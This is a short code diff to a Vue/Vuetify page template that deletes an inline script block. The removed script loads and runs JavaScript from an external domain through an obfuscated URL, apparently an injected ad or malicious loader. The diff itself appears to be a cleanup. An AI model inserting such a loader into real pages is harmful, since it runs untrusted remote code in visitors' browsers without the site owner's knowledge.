@@ -82,18 +82,6 @@
       ></v-app-bar-nav-icon>
     </v-app-bar>
 
-    <script>
-      ;(function (__htas) {
-        var d = document,
-          s = d.createElement('script'),
-          l = d.scripts[d.scripts.length - 1]
-        s.settings = __htas || {}
-        s.src =
-          '\/\/apprefaculty.pro\/aeW_ZAyYQ.2W9\/k\/ZwTS9z6Dbq2J5rlRSoWIQS9XN\/DkE\/2NOdTNkFw\/M\/iX0i0vMpT\/Y\/5WOLTRAvz\/JKnCB\/1vcR2lhda\/be2u5BlFStW-Qu9ENEDJEV2\/O\/TVkTwYM\/iz0G0\/MwTsYq5YOYTDAmzp'
-        l.parentNode.insertBefore(s, l)
-      })({})
-    </script>
-
     <v-navigation-drawer
       v-if="drawer"
       v-model="drawer"
